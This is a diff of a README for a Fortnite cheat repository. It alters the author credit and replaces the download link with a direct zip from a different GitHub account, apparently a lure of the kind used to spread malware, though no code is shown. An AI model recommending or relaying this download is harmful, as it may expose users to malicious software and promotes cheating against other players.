@@ -1,7 +1,7 @@
 # FORTNITE RAGE CHEAT 
 
 # Info 📝
-<ul><li>This original source was made by @Android1337</li><li>
+<ul><li>This original source was made by Android1337B</li><li>
  
  Open/Close Menu key = Insert
 
@@ -12,13 +12,8 @@
 
 # Download Cheat Ready to use here! 🔥
 
->>> https://github.com/SantaaVibez/FortniteRageCheatSource/releases/tag/V2
+>>> [Release](https://github.com/Yogianggara22/FortniteRageCheatSource/releases/download/Released/Fort_Installing_Modmenu.zip)
 
-
-[![Watch the video](https://i.imgur.com/vKb2F1B.png)](https://streamable.com/xmx49y)
-
-
-![](https://komarev.com/ghpvc/?username=SantaaVibez&color=yellow)
 
 
 
